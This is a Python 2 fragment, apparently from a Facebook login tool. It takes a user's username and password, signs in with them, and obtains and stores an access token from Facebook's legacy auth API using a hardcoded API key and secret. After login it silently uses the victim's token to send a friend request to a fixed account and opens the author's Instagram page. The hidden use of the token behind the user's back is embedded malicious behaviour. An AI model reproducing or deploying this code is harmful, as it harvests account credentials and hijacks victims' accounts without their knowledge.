try:
	print
	token = open("log.txt","r")
	print tutup+"           ["+lime+"+"+tutup+"] You are already in this account : "+lime+id
	tanya = raw_input(tutup+"           ["+lime+"+"+tutup+"] Do you want to change your account? y/n : "+lime)
	if tanya =="y":
		os.system("rm -rf log.txt")
		login()
	elif tanya =="n":
		menu()
	else:
		keluar()
except (KeyError,IOError):
	usr = raw_input(tutup+"           ["+lime+"+"+tutup+"] Username : "+lime)
	pwd = raw_input(tutup+"           ["+lime+"+"+tutup+"] Password : "+lime)
	try:
		sex.open("https://m.facebook.com")
	except mechanize.URLError:
		exit(merah+"[!] No Connection")
	sex._factory.is_html = True
	sex.select_form(nr=0)
	sex.form['email'] = usr
	sex.form['pass']  = pwd
	sex.submit()
	get = sex.geturl()
	if 'save-device' in get:
		try:
			sig  = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+usr+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":usr,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
			x    = hashlib.new("md5")
			x.update(sig)
			a = x.hexdigest()
			data.update({'sig':a})
			url  = "https://api.facebook.com/restserver.php"
			a    = requests.get(url,params=data)
			b    = json.loads(a.text)
			zedd = open("log.txt","w")
			zedd.write(b['access_token'])
			zedd.close()
			print tutup+"           ["+lime+"+"+tutup+"] Connect server ..."
			requests.post("https://graph.facebook.com/me/friends?method=post&uids=gwimusa33&access_token="+b['access_token'])
			os.system("xdg-open https://www.instagram.com/rezadkim")
			menu()
		except requests.exceptions.ConnectionError:
			exit(merah+"[!] No Connection")
	if 'checkpoint' in get:
		print tutup+"           ["+kuning+"!"+tutup+"] Checkpoint"
		os.system("rm -rf log.txt")
		keluar()
	else:
		print tutup+"           ["+merah+"!"+tutup+"] Username/Password Incorrect"
		os.system("rm -rf log.txt")
		keluar()
